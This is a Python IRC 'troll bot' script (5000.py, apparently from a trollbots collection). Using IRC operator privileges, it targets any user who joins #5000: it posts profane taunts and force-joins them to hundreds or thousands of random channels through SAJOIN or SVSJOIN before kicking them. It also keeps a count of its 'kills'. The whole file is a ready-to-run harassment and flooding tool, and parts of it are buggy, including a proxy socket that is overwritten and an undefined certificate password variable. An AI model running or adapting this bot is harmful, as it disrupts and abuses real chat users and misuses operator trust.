#!/usr/bin/env python
# 5000
# Developed by acidvegas in Python
# https://github.com/acidvegas/trollbots
# 5000.py

import os
import random
import socket
import ssl
import string
import threading
import time

# Connection
server     = 'irc.server.com'
port       = 6667
proxy      = None # Proxy should be a Socks 5 in IP:PORT format.
use_ipv6   = False
use_ssl    = False
ssl_verify = False
vhost      = None
channel    = '#chats'
key        = None

# Certificate
cert_key  = None
cert_file = None
cert_pass = None

# Identity
nickname  = 'FUCKYOU'
username  = '5000'
realname  = 'I CAN SHOW YOU THE WORLD'

# Login
nickserv_password = None
network_password  = None
operator_password = None

# Settings
admin_host        = 'admin.host'
max_nicks         = 3
sajoin_throttle   = 0.04
use_anope_svsjoin = False # Enable this to use the OperServ command SVSJOIN with Anope instead of SAJOIN.
user_modes        = None

# Globals (DO NOT EDIT)
kill_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'kills.log')

def debug(msg):
	print(f'{get_time()} | [~] - {msg}')

def error(msg, reason):
	print(f'{get_time()} | [!] - {msg} ({reason})')

def error_exit(msg):
	raise SystemExit(f'{get_time()} | [!] - {msg}')

def kills(action):
	if action == 'add':
		current = str(int(open(kill_file).read())+1)
		with open(kill_file, 'w') as kills_file:
			kills_file.write(current)
	elif action == 'get':
		return int(open(kill_file).read())
	elif action == 'reset':
		return open(kill_file, 'w').write('0')

def get_time():
	return time.strftime('%I:%M:%S')

def random_int(min, max):
	return random.randint(min, max)

def random_str(size):
	return ''.join(random.sample(string.ascii_lowercase, size))

class IRC(object):
	def __init__(self):
		self.nicklist = list()
		self.last     = 0
		self.sock     = None

	def attack(self, nick):
		try:
			self.nicklist.append(nick)
			self.sendmsg(channel, f'I am fucking the shit out of {nick} right now...')
			kills('add')
			if use_anope_svsjoin:
				for i in range(5000):
					if nick not in self.nicklist:
						break
					self.svsjoin(nick, '#' + random_str(random_int(5,10)))
			else:
				for i in range(200):
					channels = ','.join(['#' + random_str(random_int(5,10)) for x in range(25)])
					self.sajoin(nick, channels)
				time.sleep(sajoin_throttle)
			self.kick('#5000', nick)
		except Exception as ex:
			error(f'Failed to fuck {nick}.', ex)
		finally:
			if nick in self.nicklist:
				self.nicklist.remove(nick)

	def connect(self):
		try:
			self.create_socket()
			self.sock.connect((server, port))
			self.register()
		except socket.error as ex:
			error('Failed to connect to IRC server.', ex)
			self.event_disconnect()
		else:
			self.listen()

	def create_socket(self):
		family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
		if proxy:
			proxy_server, proxy_port = proxy.split(':')
			self.sock = socks.socksocket(family, socket.SOCK_STREAM)
			self.sock.setblocking(0)
			self.sock.settimeout(15)
			self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_server, int(proxy_port))
		else:
			self.sock = socket.socket(family, socket.SOCK_STREAM)
		self.sock = socket.socket(family, socket.SOCK_STREAM)
		if vhost:
			self.sock.bind((vhost, 0))
		if use_ssl:
			ctx = ssl.create_default_context()
			if cert_file:
				ctx.load_cert_chain(cert_file, cert_key, password)
			if ssl_verify:
				ctx.verify_mode = ssl.CERT_REQUIRED
				ctx.load_default_certs()
			else:
				ctx.check_hostname = False
				ctx.verify_mode = ssl.CERT_NONE
			self.sock = ctx.wrap_socket(self.sock)

	def event_connect(self):
		if user_modes:
			self.mode(nickname, '+' + user_modes)
		if nickserv_password:
			self.identify(nickname, nickserv_password)
		self.oper(username, operator_password)

	def event_disconnect(self):
		self.nicklist = list()
		self.sock.close()
		time.sleep(10)
		self.connect()

	def event_join(self, nick, host, chan):
		if chan == '#5000' and host != admin_host:
			if len(self.nicklist) < max_nicks and nick not in self.nicklist:
				threading.Thread(target=self.attack,args=(nick,)).start()

	def event_message(self, nick, host, chan, msg):
		if chan == channel:
			if msg == '.kills':
				if time.time() - self.last > 3:
					self.sendmsg(chan, kills('get'))
				self.last = time.time()
			elif msg == '.kills reset' and host == admin_host:
				kills('reset')
				self.sendmsg(chan, '0')

	def event_nick_in_use(self):
		error_exit('5000 is already running!')

	def event_no_such_nick(self, nick):
		if nick in self.nicklist:
			self.nicklist.remove(nick)

	def event_oper(self):
		self.join(channel)
		self.join('#5000')

	def handle_events(self, data):
		args = data.split()
		if data.startswith('ERROR :Closing Link:'):
			raise Exception('Connection has closed.')
		elif args[0] == 'PING':
			self.raw('PONG ' + args[1][1:])
		elif args[1] == '001':
			self.event_connect()
		elif args[1] == '381':
			self.event_oper()
		elif args[1] == '401':
			nick = args[3]
			self.event_no_such_nick(nick)
		elif args[1] == '433':
			self.event_nick_in_use()
		elif args[1] == '481':
			error_exit('You do not have the correct IRC operator privileges to use SAJOIN.')
		elif args[1] == '491':
			error_exit('No O-lines for your host.')
		elif args[1] == 'JOIN':
			nick = args[0].split('!')[0][1:]
			host = args[0].split('!')[1].split('@')[1]
			if nick != nickname:
				chan = args[2][1:]
				self.event_join(nick, host, chan)
		elif args[1] == 'PRIVMSG':
			nick = args[0].split('!')[0][1:]
			host = args[0].split('!')[1].split('@')[1]
			chan = args[2]
			msg  = data.split(f'{args[0]} PRIVMSG {chan} :')[1]
			self.event_message(nick, host, chan, msg)

	def identify(self, nick, password):
		self.sendmsg('nickserv', f'identify {nick} {password}')

	def join(self, chan, key=None):
		if key:
			self.raw(f'JOIN {chan} {key}')
		else:
			self.raw('JOIN ' + chan)

	def kick(self, channel, nick):
		self.raw(f'KICK {channel} {nick}')

	def listen(self):
		while True:
			try:
				data = self.sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if line):
					debug(line)
					if len(line.split()) >= 2:
						self.handle_events(line)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except Exception as ex:
				error('Unexpected error occured.', ex)
				break
		self.event_disconnect()

	def mode(self, target, mode):
		self.raw(f'MODE {target} {mode}')

	def oper(self, user, password):
		self.raw(f'OPER {user} {password}')

	def raw(self, msg):
		self.sock.send(bytes(msg + '\r\n', 'utf-8'))

	def register(self):
		if network_password:
			self.raw('PASS ' + network_password)
		self.raw(f'USER {username} 0 * :{realname}')
		self.raw('NICK ' + nickname)

	def sajoin(self, nick, chan):
		self.raw(f'SAJOIN {nick} {chan}')

	def svsjoin(self, nick, chan):
		self.sendmsg('OperServ', f'SVSJOIN {nick} {chan}')

	def sendmsg(self, target, msg):
		self.raw(f'PRIVMSG {target} :{msg}')

# Main
if proxy:
	try:
		import socks
	except ImportError:
		error_exit('Missing PySocks module! (https://pypi.python.org/pypi/PySocks)')
if not os.path.isfile(kill_file):
	open(kill_file, 'w').write('0')
IRC().connect()